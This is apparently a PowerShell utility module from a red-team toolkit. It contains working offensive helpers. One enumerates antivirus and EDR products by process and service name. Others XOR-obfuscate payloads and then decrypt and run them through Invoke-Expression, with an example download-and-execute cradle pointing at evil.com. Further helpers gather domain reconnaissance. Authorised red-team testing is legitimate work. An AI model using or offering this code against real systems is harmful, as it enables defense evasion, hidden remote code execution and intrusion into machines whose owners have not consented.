<#
.SYNOPSIS
    Utility helper functions for Native Windows Red Team Toolkit

.AUTHOR
    Anubhav Gain (@anubhavg-icpl)
#>

function Test-AdminPrivileges {
    <#
    .SYNOPSIS
        Check if current process has administrative privileges

    .EXAMPLE
        if (Test-AdminPrivileges) { Write-Host "Running as admin" }
    #>
    [CmdletBinding()]
    param()

    $identity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($identity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function Get-SecurityProducts {
    <#
    .SYNOPSIS
        Enumerate installed security products (AV, EDR, etc.)

    .EXAMPLE
        Get-SecurityProducts
    #>
    [CmdletBinding()]
    param()

    $results = @{
        AntiVirus   = @()
        AntiSpyware = @()
        Firewall    = @()
        EDR         = @()
    }

    # Query Windows Security Center (works on workstations)
    try {
        $av = Get-WmiObject -Namespace root\SecurityCenter2 -Class AntiVirusProduct -ErrorAction SilentlyContinue
        if ($av) {
            $results.AntiVirus = $av | Select-Object displayName, pathToSignedProductExe, productState
        }
    }
    catch {
        Write-Verbose "Could not query Security Center: $_"
    }

    # Check for common EDR processes
    $edrProcesses = @{
        'MsMpEng'           = 'Windows Defender'
        'CrowdStrike'       = 'CrowdStrike Falcon'
        'csfalconservice'   = 'CrowdStrike Falcon'
        'CSFalconContainer' = 'CrowdStrike Falcon'
        'cb'                = 'Carbon Black'
        'CbDefense'         = 'Carbon Black Defense'
        'SentinelAgent'     = 'SentinelOne'
        'SentinelHelper'    = 'SentinelOne'
        'cyserver'          = 'Cylance'
        'CylanceSvc'        = 'Cylance'
        'DVPSVC'            = 'Sophos'
        'SEDService'        = 'Sophos'
        'bdservicehost'     = 'Bitdefender'
        'vsserv'            = 'Bitdefender'
        'ekrn'              = 'ESET'
        'egui'              = 'ESET'
        'fshoster'          = 'F-Secure'
        'fsav'              = 'F-Secure'
        'xagt'              = 'FireEye'
        'xagtnotif'         = 'FireEye'
        'TmListen'          = 'Trend Micro'
        'NTRTScan'          = 'Trend Micro'
        'mcshield'          = 'McAfee'
        'mfetp'             = 'McAfee'
        'WRSA'              = 'Webroot'
        'kavfs'             = 'Kaspersky'
        'klnagent'          = 'Kaspersky'
    }

    $runningProcesses = Get-Process -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name

    foreach ($proc in $edrProcesses.Keys) {
        if ($runningProcesses -contains $proc) {
            $results.EDR += [PSCustomObject]@{
                ProcessName = $proc
                Product     = $edrProcesses[$proc]
            }
        }
    }

    # Check for common EDR services
    $edrServices = @(
        'CSFalconService',
        'CbDefense',
        'Sentinel Agent',
        'SentinelAgent',
        'CylanceSvc',
        'Sophos*',
        'bdservicehost',
        'ekrn',
        'xagt',
        'TmListen',
        'mcshield',
        'WRSA'
    )

    foreach ($svc in $edrServices) {
        $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
        if ($service) {
            $results.EDR += [PSCustomObject]@{
                ServiceName = $service.Name
                DisplayName = $service.DisplayName
                Status      = $service.Status
            }
        }
    }

    return $results
}

function Convert-ToBase64 {
    <#
    .SYNOPSIS
        Convert string or file to Base64

    .PARAMETER String
        String to encode

    .PARAMETER FilePath
        File to encode

    .EXAMPLE
        Convert-ToBase64 -String "Hello World"
        Convert-ToBase64 -FilePath C:\secret.txt
    #>
    [CmdletBinding()]
    param(
        [Parameter(ParameterSetName = 'String')]
        [string]$String,

        [Parameter(ParameterSetName = 'File')]
        [string]$FilePath
    )

    if ($String) {
        return [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($String))
    }
    elseif ($FilePath -and (Test-Path $FilePath)) {
        $bytes = [System.IO.File]::ReadAllBytes($FilePath)
        return [Convert]::ToBase64String($bytes)
    }
}

function Convert-FromBase64 {
    <#
    .SYNOPSIS
        Decode Base64 string

    .PARAMETER EncodedString
        Base64 encoded string

    .EXAMPLE
        Convert-FromBase64 -EncodedString "SGVsbG8gV29ybGQ="
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$EncodedString
    )

    try {
        return [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($EncodedString))
    }
    catch {
        # Try ASCII if Unicode fails
        return [System.Text.Encoding]::ASCII.GetString([Convert]::FromBase64String($EncodedString))
    }
}

function Get-RandomString {
    <#
    .SYNOPSIS
        Generate random string for obfuscation

    .PARAMETER Length
        Length of random string

    .EXAMPLE
        Get-RandomString -Length 16
    #>
    [CmdletBinding()]
    param(
        [int]$Length = 10
    )

    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    $random = 1..$Length | ForEach-Object { $chars[(Get-Random -Maximum $chars.Length)] }
    return -join $random
}

function New-EncryptedPayload {
    <#
    .SYNOPSIS
        Simple XOR encryption for payload obfuscation

    .PARAMETER Payload
        String to encrypt

    .PARAMETER Key
        Encryption key

    .EXAMPLE
        $encrypted = New-EncryptedPayload -Payload "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')" -Key "secret123"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Payload,

        [Parameter(Mandatory)]
        [string]$Key
    )

    $bytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

    $encrypted = @()
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $encrypted += $bytes[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }

    return [Convert]::ToBase64String($encrypted)
}

function Invoke-EncryptedPayload {
    <#
    .SYNOPSIS
        Decrypt and execute XOR encrypted payload

    .PARAMETER EncryptedPayload
        Base64 encoded XOR encrypted payload

    .PARAMETER Key
        Decryption key

    .EXAMPLE
        Invoke-EncryptedPayload -EncryptedPayload $encrypted -Key "secret123"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$EncryptedPayload,

        [Parameter(Mandatory)]
        [string]$Key
    )

    $encrypted = [Convert]::FromBase64String($EncryptedPayload)
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

    $decrypted = @()
    for ($i = 0; $i -lt $encrypted.Length; $i++) {
        $decrypted += $encrypted[$i] -bxor $keyBytes[$i % $keyBytes.Length]
    }

    $command = [System.Text.Encoding]::UTF8.GetString($decrypted)
    Invoke-Expression $command
}

function Get-DomainInfo {
    <#
    .SYNOPSIS
        Get basic domain information for current system

    .EXAMPLE
        Get-DomainInfo
    #>
    [CmdletBinding()]
    param()

    $cs = Get-WmiObject -Class Win32_ComputerSystem

    $info = [PSCustomObject]@{
        ComputerName  = $env:COMPUTERNAME
        Domain        = $cs.Domain
        PartOfDomain  = $cs.PartOfDomain
        DomainRole    = switch ($cs.DomainRole) {
            0 { 'Standalone Workstation' }
            1 { 'Member Workstation' }
            2 { 'Standalone Server' }
            3 { 'Member Server' }
            4 { 'Backup Domain Controller' }
            5 { 'Primary Domain Controller' }
            default { 'Unknown' }
        }
        CurrentUser   = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
        IsAdmin       = Test-AdminPrivileges
        LogonServer   = $env:LOGONSERVER
        UserDNSDomain = $env:USERDNSDOMAIN
    }

    return $info
}

function Write-Log {
    <#
    .SYNOPSIS
        Write log entry with timestamp

    .PARAMETER Message
        Log message

    .PARAMETER Level
        Log level (Info, Warning, Error, Success)

    .EXAMPLE
        Write-Log -Message "Task completed" -Level Success
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$Message,

        [ValidateSet('Info', 'Warning', 'Error', 'Success')]
        [string]$Level = 'Info'
    )

    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $prefix = switch ($Level) {
        'Info'    { "[*]" }
        'Warning' { "[!]" }
        'Error'   { "[-]" }
        'Success' { "[+]" }
    }

    $color = switch ($Level) {
        'Info'    { 'Cyan' }
        'Warning' { 'Yellow' }
        'Error'   { 'Red' }
        'Success' { 'Green' }
    }

    Write-Host "$timestamp $prefix $Message" -ForegroundColor $color
}

function ConvertTo-HexString {
    <#
    .SYNOPSIS
        Convert bytes to hex string

    .EXAMPLE
        ConvertTo-HexString -Bytes ([System.Text.Encoding]::UTF8.GetBytes("test"))
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [byte[]]$Bytes
    )

    return ($Bytes | ForEach-Object { $_.ToString("X2") }) -join ''
}

function ConvertFrom-HexString {
    <#
    .SYNOPSIS
        Convert hex string to bytes

    .EXAMPLE
        ConvertFrom-HexString -HexString "48656C6C6F"
    #>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)]
        [string]$HexString
    )

    $bytes = @()
    for ($i = 0; $i -lt $HexString.Length; $i += 2) {
        $bytes += [Convert]::ToByte($HexString.Substring($i, 2), 16)
    }
    return $bytes
}

# Export all functions
Export-ModuleMember -Function *
